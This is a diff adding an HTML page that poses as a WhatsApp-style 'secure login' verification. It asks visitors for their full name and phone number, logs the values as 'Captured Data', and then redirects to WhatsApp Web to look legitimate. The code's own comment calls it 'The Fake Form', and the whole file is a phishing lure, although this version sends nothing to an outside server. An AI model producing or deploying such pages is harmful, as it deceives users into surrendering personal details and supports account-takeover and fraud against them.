@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Login Verification</title>
+    <style>body {background:#e5ebf1;font-family:sans-serif;text-align:center;padding-top:30px;} input[type=text],input[type=tel]{width:90%;padding:10px;margin-bottom:12px;border-radius:4px; border:1px solid #ccc;}</style>
+</head>
+<body style="background-color:#e5ebf1;">
+
+<h3 style="color:#334155;"><strong>Welcome!</strong></h3>
+<p>Please verify your identity to continue the secure chat session.</p>
+
+<!-- The Fake Form -->
+<form onsubmit="captureData(this); return false;" style="max-width:300px;margin:auto;background:white;padding:20px;border-radius:8px;box-shadow:0 2px 5px rgba(0,0,0,0.1);">
+    <input type="text" id="username" placeholder="Full Name (Required)" required><br>
+    <input type="tel" id="phone" placeholder="+Country Code Number (e.g., +254...)" required><br>
+    
+    <!-- Hidden input to store the captured data temporarily in browser memory -->
+    <input type="hidden" name="captured_data" id="tempData">
+
+    <button onclick="redirectUser()" style="background:#25D366;color:white;padding:10px 20px;border:none;border-radius:4px;font-weight:bold;cursor:pointer;">Secure Login</button>
+</form>
+
+<script>
+    // This function runs when user clicks "Secure Login"
+    function captureData(form) {
+        var userName = document.getElementById('username').value;
+        var phoneNumber = document.getElementById('phone').value;
+        
+        console.log("SUCCESS! Captured Data:", userName, phoneNumber);
+        alert("Verification Successful!\n\nName: " + userName + "\nPhone: " + phoneNumber);
+        
+        setTimeout(redirectUser, 3000); // Wait 3 seconds before redirecting for effect.
+    }
+
+    // Redirects to WhatsApp Web (or any target site) after data is captured
+    function redirectUser() {
+        window.location.href = 'https://web.whatsapp.com/'; 
+    }
+
+    // Optional: Listen for messages if connected via iframe later
+    window.addEventListener('message', (event) => { console.log("External Message Received"); });
+</script>
+
+</body>
+</html>
